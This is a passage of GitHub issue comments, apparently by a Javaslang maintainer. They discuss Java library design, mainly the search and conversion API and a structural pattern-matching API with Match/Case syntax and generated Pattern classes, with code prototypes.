repo for \"oracle.com\" and found only Java 8 references. Have you found a Java 6 reference?\n. Aahh :) Didn't know that. Many thanks - will be fixed ASAP!\n. Hi Ruslan, thank you! I think, currently we cannot get around most of the casts, Java 8 does it also in TreeMap etc. However, I think we can use contains(T) if we know that T is final, like for Character or Tuple2.\n. See comments on the original issue:\n- https://github.com/javaslang/javaslang/issues/1065#issuecomment-177153894\n- https://github.com/javaslang/javaslang/issues/1065#issuecomment-177167063\n. Uh, oh - that was fast. Do you think the cast solution is better than using Objects?\n. ok\n. That would be great!\nI want to see these methods in the Traversable interface. Other collections may override them with appropriate return type.\nBut before implementation we need to get a clear picture which methods we need\nFollowing steps:\n- Let's prototype the method signatures and define their purpose (iterate, fold, unfold. also foldRight, foldLeft?). Ideally we take a look at existing signatures from Scala and Scalaz!\n- How does fold(T, Option)  differ from undold?\n- How does fold(T, Option) differ from iterate?\nCould you start with these points?\n. Thanks\n. Hi @mattjtodd ,\nthanks for your feedback! Please create a new Github issue for the cases that cause trouble.\nI will close this ticket now.\n. Yep, right, LinearSeq will have a linear search. I didn't know Scala's Searching but I like the idea to hide the strategy behind a search method.\nThe search method that takes a Comparator can be an instance method:\njava\ninterface Seq<T> {\n    int search(Comparator<? super T> comparator, T key);\n}\nFor the other method, using the natural Comparator Seq<? extends Comparable<? super T>>, we have two choices:\n1. We provide static methods in Seq and/or in IndexedSeq/LinearSeq and/or maybe in List/Stream/...\njava\n   interface Seq<T> {\n       static int search(Seq<? extends Comparable<? super T>> seq, T key);\n   }\n   interface IndexedSeq<T> {\n       // or just 'search'\n       static int binarySearch(IndexedSeq<? extends Comparable<? super T>> seq, T key);\n   }\n   interface LinearSeq<T> {\n       // or just 'search'\n       static int linearSearch(LinearSeq<? extends Comparable<? super T>> seq, T key);\n   }\n   interface List<T> {\n       // or just 'search'\n       static int linearSearch(List<? extends Comparable<? super T>> list, T key);\n   }\n   ...\n2. We provide an instance method Seq.search(T key) and compute the natural comparator, which may throw a ClassCastException. Java's SortedSet and SortedMap work in this unsafe way. We already assume that the elements are sorted in ascending order, so assuming that they are comparable might be ok.\njava\n   interface Seq<T> {\n       // @throws ClassCastException if T is not Comparable\n       int search(T key);\n   }\nWhat do you think? I like the second approach. It is easy to use, easy to implement - but unsafe. User has to take care that elements are sorted in ascending order, though.\n. We could return an int and save time & mem by not creating additional SearchResult instances:\n- a positive int indicates the found position\n- a negative int indicates the negated insertion position\nExample:\njava\nList<Integer> list = List.of(1, 3, 5, 7);\nint elem = 4;\nint index = list.search(elem);\nif (index >= 0) {\n    // elem found at index\n} else {\n    list = list.insert(-index, elem);\n}\nIf we had a SearchResult, it would be\njava\nList<Integer> list = List.of(1, 3, 5, 7);\nint elem = 4;\nSearchResult searchResult = list.search(elem);\nif (searchResult.isFound()) {\n    // elem found at searchResult.foundIndex()\n} else {\n    list = list.insert(searchResult.insertionPoint(), elem);\n}\nwith\n``` java\npublic interface SearchResult {\nboolean isFound();\n\n// -1 if !isFound\nint foundIndex();\n\n// = foundIndex if isFound\nint insertionPoint;\n\n}\npublic final class Found implements SearchResult { ... }\npublic final class InsertionPoint implements SearchResult { ... }\n```\n. There is a problem with effectively final vars:\n``` java\nList list = ...;\n// ERROR: Variable used in lambda expression should be final or effectively final\nlist.search(3).whenAbsent(i -> { list = list.insert(i, 3); });\n```\nwe would need another whenAbsent method, e.g.:\n``` java\ninterface SearchResult, T> {\nboolean isFound();\n\nint foundIndex();\n\nint insertionPoint();\n\nT key();\n\nU seq();\n\ndefault U whenAbsent(Function<SearchResult<U, T>, U> insertionHandler) {\n    if (!isFound()) {\n        return insertionHandler.apply(this);\n    } else {\n        return seq();\n    }\n}\n\n}\n```\nused like this:\njava\nlist.search(3)\n    .whenAbsent(result -> result.seq().insert(result.insertionPoint(), result.key()));\nI think it could be done better, e.g. by passing the relevant parameters directly to the handler instead of extracting them manually on the result. But it looks too complicated. Maybe we should return the index as in Collections.\n. Let's return an int :) That's not too bad!\n. Great :) Looking forward to review your PR!\n. Done with #1088\n. Works like a charm - ticket can be closed.\nExample:\n``` java\nIterable> tuples = List.of(\n        Tuple.of(\"Emil\", 7),\n        Tuple.of(\"Leni\", 5),\n        Tuple.of(\"Paul\", 3));\nMap map1 = HashMap.ofEntries(tuples);\nMap map2 = HashMap.ofEntries(\n        Tuple.of(\"Emil\", 7),\n        Tuple.of(\"Leni\", 5),\n        Tuple.of(\"Paul\", 3));\n```\n. Hi @bartolom ,\nyou are right, this is a bit confusing. On the one hand 'Java' is a language, on the other hand it is widely used as synonym for the runtime libraries shipped with the JDK - all libs and utils contained in Java is Java.\nThe 'Java Collection Framework' (JCF) is also referred to as 'Java Collections'. So by 'toJavaList' we mean 'toJavaCollectionFrameworkList'. Because 'List' is a collection and (in general) 'toJavaCollectionFrameworkCollection' is redundant, it is just 'toJavaCollection'.\nI also thought about 'toJdkList'. But the JDK is used by developers. Users use the JRE in general, which also includes the Java Collections. So both 'toJdkList' and 'toJreList' are not right. 'toJcfList' would be right but most people will not understand it.\nI think you are right, the whole conversion topic (Javaslang back and forth to Java) needs to be covered, at least in the documentation. We should also add javadoc in the Value class, which contains most of the conversion methods.\n. @bartolom yes, I understand\n. Need to add unit tests for these:\n- Value#toJavaCollection(Supplier) \u2713\n- Value#toJavaList(Supplier) \u2713\n- Value#toJavaMap(Supplier, Function) \u2713\n- Value#toJavaSet(Supplier) \u2713\n- Map/HashMap/LinkedHashMap/TreeMap#toJavaMap()\n- Set/HashSet/LinkedHashSet/TreeSet#toJavaSet()\n. Done with #1079. Pending tests moved to #477 \n. Ok - this saves time editing the website etc.\n. For Rose trees it makes not sense to allow the empty tree as child (see https://wiki.haskell.org/Algebraic_data_type#Rose_tree).\nhaskell\ndata Rose a = Rose a [Rose a]\nHowever, having a representation for the empty tree is still valid.\n. Note: The following classes do not have a narrow() method yet:\n- Either.LeftProjection, Either.RightProjection\n- Match.MatchValue, Match.MatchFunction\nThese are intended to be used as intermediate objects. narrow() may be added later for these if needed.\n. Done with #1085\n. Towards #1078 \n. Thank you!\n. Thank you Ruslan. I'm currently investigating structural-pattern-matching - a real stroke of luck! See #1087\n. Yes, I know. Used it in the prototype in order to make it look more like Scala but it will probably change the name. Or we convince the Java guys to leave it :)\n. We need a placeholder for any value.\n- _ will be an illegal identifier in JDK9. http://openjdk.java.net/jeps/213\n- Using _ will break actual Java 8 builds when using -Xlint:all -Werror\nExample:\nscala\n// Scala\nmatch o {\n    case Some(_) => ...\n    case None => ...\n}\njava\n// Javaslang prototype\nmatch(o)\n    .when(Some(_)).then(...)    // <---- _ not supported any more with JDK 9 :-/\n    .when(None).then(...)\nWhich alternatives do we have?\nE.g. __ is valid...\n``` java\n// Javaslang prototype\nmatch(o)\n    .when(Some(__)).then(...)\n    .when(None).then(...)\nmatch(t)\n    .when(Tuple1()).then(...)\n    .when(Tuple2(, )).then(...)\n    .when(Tuple3(, , )).then(...)\n    .when(__).then(...)\n```\n...but lame.\n. I was tempted to switch to Javaslang's original caze syntax ;) E.g. instead of otherwise(...) we will have caze(_).\njava\nmatch(option)\n    .caze(Some(_)).then(\"It is a Some!\")\n    .caze(_)      .then(\"It is a None!\")\nMaybe also no then:\njava\nmatch(option)\n    .caze(Some(_), \"It is a Some!\")\n    .caze(_,       \"It is a None!\")\nAnother example:\nscala\n// Scala: ????? don't know how to do that\nval list = List(Some(1), Some(2), Some(3))\nlist match {\n    case x :: xs => ???\n}\njava\n// Javaslang\nList<Option<Integer>> list = List.of(Option.some(1), Option.some(2), Option.some(3));\nmatch(list)\n    .caze(List(Some($(1)), List($(), _)), (one, intOption) -> ...)\n. Yes, that would be a good fit to the other matchers $() and $(val)!\n. :+1: I will use $_ in the prototype!\n. Our Match API has methods\njava\npublic <T1> Then1<T, T1> when(Pattern1<T, T1> pattern) { ... }\npublic <T1, T2> Then2<T, T1, T2> when(Pattern2<T, T1, T2> pattern) { ... }\npublic <T1, T2, T3> Then3<T, T1, T2, T3> when(Pattern3<T, T1, T2, T3> pattern) { ... }\n// ... up to when(Pattern8)\nIn a previous prototype Pattern0 to Pattern8 where interfaces.\n``` java\n@FunctionalInterface\ninterface Pattern0 {\n    Option apply(Object o);\n}\n@FunctionalInterface\ninterface Pattern1 {\n    Option apply(Object o);\n}\n@FunctionalInterface\ninterface Pattern2 {\n    Option> apply(Object o);\n}\n@FunctionalInterface\ninterface Pattern3 {\n    Option> apply(Object o);\n}\n// ... up to Pattern8\n```\nThe compiler warns that these interfaces raise ambiguities when used as args in when, see above. Even if the @FunctionalInterface annotation is removed, the use of similar SAM interfaces will still raise possible ambiguities.\nI'm curious if it really fails at runtime but instead of going deeper I will use the existing prototype and will focus on a complete solution.\nCurrently the solution is to use abstract classes instead. Then the when method signatures are uniform by argument type and the compiler does not complain any more.\n``` java\nabstract class Pattern0 {\n    public abstract Option apply(Object o);\n}\nabstract class Pattern1 {\n    public abstract Option apply(Object o);\n}\nabstract class Pattern2 {\n    public abstract Option> apply(Object o);\n}\nabstract class Pattern3 {\n    public abstract Option> apply(Object o);\n}\n// ... up to Pattern8\n```\nHowever, it would be great to use lambdas instead of abstract classes. For benchmarks lambda vs. abstract class see http://www.oracle.com/technetwork/java/jvmls2013kuksen-2014088.pdf\nMaybe someone has the time to investigate if Pattern0 to Pattern8 can be interfaces or if it is possible in general to use interfaces instead of abstract classes. See javaslang.Match and javaslang.MatchTest.\n. I think that it will make sense to add guards, e.g.\njava\n// like Scala's match o { case ... if ... => ... }\nList<Integer> list = ...;\nMatch.of(list)\n     .when(List($(), $()))\n     .with((x, ignored) -> x >= 0)\n     .then((x, xs) -> ...);\nNaming: Could be also\njava\nMatch.of(...).when(...).with(...).then(...);\nMatch.of(...).when(...).and(...).then(...);\nMatch.of(...).when(...).given(...).then(...);\nMatch.of(...).when(...).guardedBy(...).then(...);\nMatch.of(...).when(...).provided(...).then(...);\n// etc.\n. To align thy syntax to Scala I propose the following:\njava\nmatch(o)\n    ._case(...)._if(...).then(...)\n    ._case(...).then(...);\n. Yes, that looks much cleaner but also a little like C# :-) If will be a method but needs to be upper-case here.\nThe nice thing about the of-scope is that it might enable us to make exhaustive checks. Need to verify that. Another nice thing about the of-scope is that this will simplify the implementation I think - great idea!\nAlso it would be a clean API to have constructors like Scala's companion apply methods, e.g. List(...) instead of List.of(...). That would align to Match(o) and Case(...).\nAlso the naming schema for patterns is not 100% clear. We could use List() or Nil, List(x, xs) or Cons(x, xs) (in Scala: x :: xs). But I think we need to take a different approach than Scala here and have List() and List(x, xs).\nWill come back tomorrow to these ideas. gdn8!\n. @evacchi Looks more than good to me - you are a genius! This can be used to automatically return the upper type bound of all then()-results :-)))\nHere is a little test, which returns BigDecimal in one case and Integer in the other case. The overall result is correctly recognized as Number! I thought this is not possible, currently we give a type-hint in such cases in Javaslang (Match.as(Number.class)...).\nNow, I found a new hobby. Add unused generics to methods that provide the compiler with types that help it during compilation. I think that might be called 'phantom type' (see Phantom Types in Scala).\nI've used similar type-magic for structural pattern matching to transport types back-and-forth through the recursive structure of objects. Later I read that article mentioned above. Didn't know that Java's type system is capable of such things and still don't fully understand it.\n``` java\n// only one import for all types and methods!\nimport static javaslang.Match.*;\nclass Test {{\nObject o = new Object();\nPattern p = new Pattern() {};\n\n// Number (!) <-- upper type bound of all results computed here :)\nMatch(o).of(\n        Case(p).then(() -> new BigDecimal(\"1\")),\n        Case(p).then(() -> 1)\n);\n\n}}\n```\nBased on this:\n``` java\nimport java.util.function.Supplier;\npublic final class Match {\nstatic <T> Match<T> Match(T t) {\n    return new Match<>();\n}\n\n// upper type bound is auto-magically computed with SUP, although unused\n@SafeVarargs\nfinal <SUP extends R, R> R of(Then<R>... cases) {\n    return null;\n}\n\n// I'm sure T needs to be 'transported' from Match to Pattern to Case\nstatic Case Case(Pattern p) {\n    return new Case();\n}\n\nstatic final class Case {\n    <R> Then<R> then(Supplier<? extends R> o) {\n        return new Then<>();\n    }\n}\n\nstatic final class Then<R> {}\n\nstatic abstract class Pattern {}\n\n}\n```\n. I like the API\njava\nMatch(o).of(\n  Case(pattern).then(...)\n  Case(...).then(...)\n)\nbut it is not possible to inject the type of o into the Case(...) method call. Then the pattern does not 'know' the type of o at compile time and we can't decompose o with matchers $(), $(val).\nIt does not matter. Then we fall back to the original API. It is just about naming things.\nThe upper type bound computation would be cool though.\n. Awesome, I've got a working example here for both result bound computation and type-safe patterns.\nThis (modulo naming) will be the syntax. All other possibilities do not work (see below).\nThe following tests are all about types. They do not implement structural pattern matching.\nWORKING\n``` java\npublic class ScopedResultTest {\npublic static void main(String[] args) {\n\n    // upper bound of result computed correctly\n    final Option<Number> num = Match(List.of(1)).of(\n            // DOES CORRECTLY NOT COMPILE, BECAUSE \"1\" is not int:\n            // Case(List(\"1\"), o -> Option.of(1)),\n            Case(List(1), list -> Option.of(new BigDecimal(\"1\"))),\n            Case(List(2), list -> Option.of(Double.NaN))\n    );\n\n}\n\nstatic <T> MatchBuilder<T> Match(T t) {\n    return new MatchBuilder<>();\n}\n\nstatic <T, U, R> Case<T, R> Case(Pattern1<T, U> p, Function<? super U, ? extends R> f) {\n    return new Case<>();\n}\n\nstatic final class MatchBuilder<T> {\n    @SafeVarargs\n    final <SUP extends R, R> R of(Case<T, ? extends R>... cases) { return null; }\n}\n\nstatic final class Case<T, R> {}\n\nstatic abstract class Pattern1<T, T1> {\n}\n\nstatic <T extends List<U>, U> Pattern1<List<U>, T> List(U t) {\n    return null;\n}\n\n}\n```\nNOT WORKING\n``` java\npublic class ScopedResultTest2 {\npublic static void main(String[] args) {\n\n    // upper bound computed\n    final Option<Number> num = Match(List.of(1),\n            // ERROR: List(\"1\") DOES COMPILE BUT SHOULD NOT\n            Case(List(\"1\"), o -> Option.of(1)),\n            Case(List(1), list -> Option.of(new BigDecimal(\"1\"))),\n            Case(List(2), list -> Option.of(Double.NaN))\n    );\n\n}\n\n@SafeVarargs\nstatic <T, SUP extends R, R> R Match(T t, Case<T, ? extends R>... cases) { return null; }\n\nstatic <T, U, R> Case<T, R> Case(Pattern1<T, U> p, Function<? super U, ? extends R> f) {\n    return new Case<>();\n}\n\nstatic final class Case<T, R> {}\n\nstatic abstract class Pattern1<T, T1> {\n}\n\nstatic <T extends List<U>, U> Pattern1<List<U>, T> List(U t) {\n    return null;\n}\n\n}\n```\n``` java\n@SuppressWarnings(\"ConstantConditions\")\npublic class FluentResultTest {\npublic static void main(String[] args) {\n\n    // TYPE HINT DOES NOT WORK FOR GENERICS LIKE Option<String>\n    final Option option = Match(List.of(1), Option.class)\n            // DOES CORRECTLY NOT COMPILE, BECAUSE \"1\" is not int:\n            // .Case(List(\"1\")).then(i -> 1)\n            .Case(List(1)).then(list -> Option.of(new BigDecimal(\"1\")))\n            .Case(List(2)).then(list -> Option.of(Double.NaN))\n            .get();\n\n}\n\nstatic <T, R> MatchBuilder<T, R> Match(T t, Class<R> hint) {\n    return new MatchBuilder<>();\n}\n\nstatic final class MatchBuilder<T, R> {\n\n    <T1> Case1<T, T1, R> Case(Pattern1<T, T1> p) {\n        return null;\n    }\n\n    R get() {\n        return null;\n    }\n}\n\ninterface Case1<T, T1, R> {\n    MatchBuilder<T, R> then(Function<? super T1, ? extends R> f);\n}\n\nstatic abstract class Pattern1<T, T1> {\n}\n\nstatic <T extends List<U>, U> Pattern1<List<U>, T> List(U t) {\n    return null;\n}\n\n}\n```\n. I added the new Match API to my fork - and removed the old one.\nIn order to prevent diverging from HEAD too much I want to create a PR neartime.\nMatch is fully working, but raw. Before we merge the changes into the head, we need to\n- add Patterns. This implies that we have a working annotation processor that generates the necessary Pattern code. For hand-crafted test-Patterns see javaslang.MatchTest\nAfter that, the following needs to be done:\n- re-think Matchers. Do we really need them? I Think the new API can do better, if we add if-guards.\n  - is(T) - or maybe Case(T, f)\n  - isIn(T...)\n  - type(Class<T>)\n  - typeIn(Class<?>)\n  - ...\n- add if-guards\njava\n  // guard : Predicate<...>, f : Function<..., R>\n  Match(o).of(\n          Case(pattern, guard, f),\n  );\n- Re-writing Match Tests. The old ones are saved but commented out.\n- Value.match() currently returns Match<Value> but we need to change this method to Value.match(Cases...) to have syntactic sugar like this:\n``` java\n  // default way\n  Match(list).of(\n          Case(List($(), $()), (x, xs) -> \"head: \" + x + \", tail: \" + xs),\n          Case($_, -> \"Nil\")\n  );\n// syntactic sugar\n  list.match(\n          Case(List($(), $()), (x, xs) -> \"head: \" + x + \", tail: \" + xs),\n          Case($_, -> \"Nil\")\n  );\n  ```\n. ## Status update\nI made progress with the code generator. It should be usable now.\nAdditionally the picture gets more and more clear what to generate and how to model the things we want to generate.\nExample:\nLet's consider some arbitrary, user-defined class we want to pattern match. Please note, that it is declared final.\n``` java\nstatic final class Developer implements Person {\n    private final String name;\n    private final boolean isCaffeinated;\nDeveloper(String name, boolean isCaffeinated) {\n    this.name = name;\n    this.isCaffeinated = isCaffeinated;\n}\n\npublic String getName() { return name; }\n\npublic boolean isCaffeinated() { return isCaffeinated; }\n\n}\n```\nOur goal is to have a static method Developer that can be used as pattern in a Case statement:\njava\nDeveloper dev = new Developer(\"Grobi\", true);\nMatch(dev).of(\n        Case(Developer($(), true), name -> name + \" is caffeinated!\"),\n        Case($_, \"catch all\")\n);\nThis is how the pattern-declaration should look like:\njava\n// USER-DEFINED\n@Patterns\nclass My {\n    @Unapply\n    static Tuple2<String, Boolean> Developer(Developer dev) {\n        return Tuple.of(dev.getName(), dev.isCaffeinated());\n    }\n}\nThen, at compile time, a class MyPatterns in the same package is generated. This class will look like this:\n``` java\n// THIS IS THE GENERATED PART\npublic final class MyPatterns {\nprivate MyPatterns() {}\n\npublic static <T1, T2> Pattern2<Developer, T1, T2> Developer(Pattern1<String, T1> p1, Pattern1<Boolean, T2> p2) {\n    return Pattern2.create(Developer.class, My::Developer, p1, p2);\n}\n\n// + many more methods (in general) for all variations of Pattern0, ..., Pattern8, InversePattern and plain values of type T.\n// REMINDER TO MYSELF: some types are atomic and need not to be pattern matched deeper (String, Integer, Boolean, ...)\n\n}\n```\nBecause My is package-private (will be checked by the annotation processor), it will be no public API. Users will only have to import static my.package.MyPatterns.* to use the patterns.\nThe Pattern2 factory method will look like this (hidden, part of Javaslang):\n``` java\npublic static abstract class Pattern2 {\npublic abstract Option<Tuple2<T1, T2>> apply(Object o);\n\npublic static <TYPE, A1, A2, T1, T2> Pattern2<TYPE, T1, T2> create(\n        Class<TYPE> matchableType,\n        Function<TYPE, Tuple2<A1, A2>> unapply,\n        Pattern1<A1, T1> p1,\n        Pattern1<A2, T2> p2) {\n    return new Pattern2<TYPE, T1, T2>() {\n        @Override\n        public Option<Tuple2<T1, T2>> apply(Object o) {\n            if (o != null && matchableType.isAssignableFrom(o.getClass())) {\n                @SuppressWarnings(\"unchecked\")\n                final TYPE matchable = (TYPE) o;\n                final Tuple2<A1, A2> t = unapply.apply(matchable);\n                return p1.apply(t._1).flatMap(v1 -> p2.apply(t._2).map(v2 -> Tuple.of(v1, v2)));\n            } else {\n                return Option.none();\n            }\n        }\n    };\n}\n\n}\n```\nNext\nThis looks pretty straight forward now. I think the trickiest part is to extract the generics of the method args during annotation processing. Will dive into that...\n. Other pattern declarations look like this:\n``` java\n@Patterns\nclass My {\n@Unapply static <T> Tuple1<T> Some(Option.Some<T> some) { return Tuple.of(some.get()); }\n@Unapply static Tuple0 None(Option.None<?> none) { return Tuple.empty(); }\n\n@Unapply static <T> Tuple2<T, List<T>> Cons(List.Cons<T> cons) { return Tuple.of(cons.head(), cons.tail()); }\n@Unapply static Tuple0 Nil(List.Nil<?> nil) { return Tuple.empty(); }\n\n// followed by many other patterns and maybe (private) helper methods\n\n}\n```\nThis should be all what is needed to make user-types pattern-matchable. All other things happen auto-magically at compile-time.\n. Yay! The generic type information is accessible!!!\nSource which is interpreted by annotation processor:\n``` java\n@Patterns\nclass Moo {\n// Option\n@Unapply static <T> Tuple1<T> Some(Option.Some<T> some) { return Tuple.of(some.get()); }\n@Unapply static Tuple0 None(Option.None<?> none) { return Tuple.empty(); }\n\n// List\n@Unapply static <T> Tuple2<T, List<T>> Cons(List.Cons<T> cons) { return Tuple.of(cons.head(), cons.tail()); }\n@Unapply static Tuple0 Nil(List.Nil<?> nil) { return Tuple.empty(); }\n\n// Developer\n@Unapply static Tuple2<String, Boolean> Developer(Developer dev) { return Tuple.of(dev.getName(), dev.isCaffeinated()); }\n\n// TEST!\nvoid non_static_method() {}\nTuple2<String, Boolean> no_annotation(Developer dev) { return Tuple.of(dev.getName(), dev.isCaffeinated()); }\n\n}\n```\nProgrammatically extracted:\nMETHOD: <T>Some(javaslang.control.Option.Some<T>)\n  TYPE MIRROR: <T>(javaslang.control.Option.Some<T>)javaslang.Tuple1<T>\n  RETURN TYPE: javaslang.Tuple1<T>\n    KIND: DECLARED\n    DECLARED TYPE: javaslang.Tuple1<T>\n      TYPE ARGS: T\n  TYPE PARAMETER:\n    GENERIC: <T>Some(javaslang.control.Option.Some<T>)\n    TYPE MIRROR: T\nMETHOD: None(javaslang.control.Option.None<?>)\n  TYPE MIRROR: (javaslang.control.Option.None<?>)javaslang.Tuple0\n  RETURN TYPE: javaslang.Tuple0\n    KIND: DECLARED\n    DECLARED TYPE: javaslang.Tuple0\n      TYPE ARGS: \nMETHOD: <T>Cons(javaslang.collection.List.Cons<T>)\n  TYPE MIRROR: <T>(javaslang.collection.List.Cons<T>)javaslang.Tuple2<T,javaslang.collection.List<T>>\n  RETURN TYPE: javaslang.Tuple2<T,javaslang.collection.List<T>>\n    KIND: DECLARED\n    DECLARED TYPE: javaslang.Tuple2<T,javaslang.collection.List<T>>\n      TYPE ARGS: T,javaslang.collection.List<T>\n  TYPE PARAMETER:\n    GENERIC: <T>Cons(javaslang.collection.List.Cons<T>)\n    TYPE MIRROR: T\nMETHOD: Nil(javaslang.collection.List.Nil<?>)\n  TYPE MIRROR: (javaslang.collection.List.Nil<?>)javaslang.Tuple0\n  RETURN TYPE: javaslang.Tuple0\n    KIND: DECLARED\n    DECLARED TYPE: javaslang.Tuple0\n      TYPE ARGS: \nMETHOD: Developer(javaslang.test.Developer)\n  TYPE MIRROR: (javaslang.test.Developer)javaslang.Tuple2<java.lang.String,java.lang.Boolean>\n  RETURN TYPE: javaslang.Tuple2<java.lang.String,java.lang.Boolean>\n    KIND: DECLARED\n    DECLARED TYPE: javaslang.Tuple2<java.lang.String,java.lang.Boolean>\n      TYPE ARGS: java.lang.String,java.lang.Boolean\nNow it is 'only' the processing logic which has to be implemented.\n. I've merged a first version.\nBuilding Patterns at Compile Time\nEvery project that uses Javaslang can define its own patterns for pattern matching. In addition to Javaslang, it needs also this dependency:\nxml\n<dependency>\n    <!-- will be changed to io.javaslang soon -->\n    <groupId>com.javaslang</groupId>\n    <artifactId>javaslang-match</artifactId>\n    <!-- don't depend on snapshots! -->\n    <version>2.0.0-RC5-SNAPSHOT</version>\n    <scope>compile</scope>\n</dependency>\nWe define Patterns this way:\n- @Patterns class My will be class MyPatterns.\n- @Patterns class $ will be class Patterns. (special case / syntactic sugar)\nI've pre-defined first patterns for test purpose:\n``` java\n@javaslang.match.Patterns\nclass $ {\n// Option\n@Unapply static <T> Tuple1<T> Some(Option.Some<T> some) { return Tuple.of(some.get()); }\n@Unapply static Tuple0 None(Option.None<?> none) { return Tuple.empty(); }\n\n// List\n@Unapply static <T> Tuple2<T, List<T>> Cons(List.Cons<T> cons) { return Tuple.of(cons.head(), cons.tail()); }\n@Unapply static Tuple0 Nil(List.Nil<?> nil) { return Tuple.empty(); }\n\n}\n```\nWhen compiling the project, the annotation processor runs automatically and creates our patterns. I've checked our patterns into version control. This is how the generated code looks like (will be simplified a bit soon).\nUsing Pattern Matching\nFirst we need to import the general Match API and specific Patterns.\njava\nimport static javaslang.Match.*;\nimport static javaslang.Patterns.*;\nThen we can start to match objects. The next days I will add Patterns for all Javaslang objects. Patterns for other Java objects might follow.\n``` java\n// our test object\nOption> TUPLE2_OPTION = Option.of(Tuple.of(\"Test\", 123));\n// a first test\nMatch(TUPLE2_OPTION).of(\n        Case(Some($()), value -> {\n            Tuple2 tuple2 = value; // types are inferred correctly!\n            ...\n        })\n);\n```\nMore examples:\n``` java\nList list = List.empty();\nMatch(list).of(\n        Case(Cons(\"1\", $_), () -> \"starts with 1\"),\n        Case(Nil, () -> \"empty\")\n);\n// current syntactic sugar, works for all Javaslang Values\nlist.match().of(\n        Case(Cons(\"1\", $_), () -> \"starts with 1\"),\n        Case(Nil, () -> \"empty\")\n);\n// will be soon changed to, plus additional sugar\nlist.match(\n        Case(Cons(\"1\", $_), \"starts with 1\"),\n        Case(Nil, \"empty\")\n);\n```\nBut it is still an early draft.\nWe currently have ambiguities because I allowed to match generic values:\njava\nCons(1, List.of(1, 2, 3))\nThis leads to\n`` java\n//Cons($(), $())results in(x, xs) -> ...`\nstatic <__, T> void Cons(InversePattern<? extends T> p1, InversePattern<? extends List> p2) {\n}\n// Ambiguous to the above, Cons($(), $()) does not compile any more\nstatic <__, T> void Cons(T p1, InversePattern<? extends List> p2) {\n}\n```\nBut that's no problem. Beside removing generic values at all, we have several options to fix it. Here are some simple examples (which scale):\nSolution 1: Add additional generic parameters with extends relation\njava\nstatic <__, T, T2 extends T> void Cons(T p1, InversePattern<? extends List<T2>> p2) {\n}\nSolution 2: Cons(1, $()) and Cons(\"1\", $()) do both compile. This is unsafe!\njava\nstatic <__, T> void Cons(Object p1, InversePattern<? extends List<T>> p2) {\n}\nSolution 3: Cons(Eq(1), $()) Syntax unsatisfying/too complicated.\njava\nstatic <__, T> void Cons(EqualsPattern<? extends T> p1, InversePattern<? extends List<T>> p2) {\n}\nCurrently I prefer the suggested Solution 1 but have to investigate it a bit.\nNext steps:\n- Complete patterns for unapplying all Javaslang objects\n- Tests, tests, tests\n- Take a look at the TODOs in Match / Generator.scala\n- Change documentation\n. I want to keep it even simpler, just import\njava\nimport static javaslang.Predef.*;\nAnd then use\n- basic Match API\n- Match Patterns for all Javaslang types\n- and maybe soon also For comprehension API\n. In order to solve the recursive pattern matching problem, we generate methods for all possible combinations of pattern arities - theoretically. Practically, we have an upper bound - currently the maximum tuple arity (because the unapply result is a tuple).\nExample: Let's consider a Tuple2<Option<String>, Option<Integer>>.\nIf we use a pattern Tuple2($_, $_) the method Tuple2(Pattern0, Pattern0) is called, whereas a the use of Tuple2($(), $_) leads to a call of Tuple2(InversePattern, Pattern0).\nHaving possible parameter types { T, InversePattern, Pattern0, Pattern1, ..., Pattern8 } this leads to a significant amount of method signatures with increasing parameter count.\nWe have 11 pattern types (see. above). The number of methods is therefore 11^number_of_args, namely\n| args | methods |\n| --- | --- |\n| 0 | 1 |\n| 1 | 11 |\n| 2 | 121 |\n| 3 | 1331 |\n| 4 | 14641 |\n| 5 | 161051 |\n| 6 | 1771561 |\n| 7 | 19487171 |\n| 8 | 214358881 |\nIt is clear that we can't generate lookup-tables of that much methods. Instead we will do it the pragmatic way. Objects may be unapplied to 0, 1 or 2 elements. I.e. we will generate these variations:\n| args | methods |\n| --- | --- |\n| 0 | 1 |\n| 1 | 11 |\n| 2 | 121 |\nIf objects are deconstructed to so-called atomic types that cannot be further deconstructed (by definition), e.g. Integer, Byte, String, ..., then the generated method count reduces to 4^number_of_args (4 possible patterns: { T, InversePattern, Pattern0, Pattern1 }).\n| args | methods |\n| --- | --- |\n| 3 | 64 |\n| 4 | 256 |\n| 5 | 1024 |\n| 6 | 4096 |\n| 7 | 16384 |\n| 8 | 65536 |\nThat is still too much for arguments > 3 or 4.\nWe will be still able to filter deconstructed values with guards, e.g.\njava\nMatch(tuple8).of(\n    Case(t -> equals(t._1, t._2), // guard\n         t -> ...) // result\n)\n\nA compiler could reduce all this to 1 method per unapply per case. But I think this is currently not possible with Java because we can't hook into the compiler like Scala with Scala Macros.\nHowever, real pattern matching for up to 2 args is still great because it should fit for nearly all Javaslang Value types (but not Tuples).\n. I think I've found a way to reduce the number of generated method per unapply method to ... just 1.\nHowever, the behavior will change.\n1. We can still recognize patterns of arbitrary depth\n2. But only the properties of the given/matched object are extracted/unapplied\nAlso we will have just two atomic matchers and we have to pass patterns instead of arbitrary objects:\n- $() will match any object\n- $(object) will match object\n``` java\nOption>> option = Option.of(Option.of(Option.of(\"ok\")));\n// here all x denote the value of the given option, if it is a Some\nfinal Number number = Match(option).of(\n       Case(None(), () -> new BigDecimal(\"1\")),\n       Case(Some(None()), x -> (byte) 2),\n       Case(Some(Some(Some($(\"ok\")))), x -> 1.0d),\n       Case(Some(Some(Some($()))), x -> 3.0d)\n);\n```\nEspecially we cannot write Case(Some(\"string\"), () -> ...) any more. Instead we write Case(Some($(\"string\")), s -> ...).\nNote: Beside the number of generated methods there is one significant benefit: The user does not have to check the order of deeply extracted parameters within the pattern tree. We now just unapply the values of the given object to be matched regardless a match of inner objects.\n. Idea: Having generated Match Patterns at hand, we could use them to define an object query language to extract specific parts from an object graph. This is roughly the same as pattern matching. But as we already saw, practically we can't pre-calculate the number of extracted objects by just using the type system. That would involve too many pre-generated patterns.\nBut maybe it is possible to traverse the ~~object~~ pattern graph and collect the results in an HList (see #237) instead of a Tuple.\nThis will not be implemented for 2.0.0. I just wanted to write down the idea here. The current API isn't capable of that. Perhaps that would raise the need to introduce a separate internal object query dsl based on the basic pattern matching ideas described here.\n. Idea: Add an additional atomic pattern $(Predicate) that matches only, if the predicate is fulfilled.\n``` java\nList ints = ...;\nMatch(ints).of(\n    Case(Cons($(i -> i > 2), $()), (x, xs) -> ...)\n);\n// also possible\nMatch(ints).of(\n    Case(Cons($(1), Cons($(i -> i > 2), $())), (x, xs) -> ...)\n);\n```\nDoes <T> ... $(Predicate<? super T>) clash with <T> ... $(T)?\nUpdate: Seems not to clash :)\n. This should also be 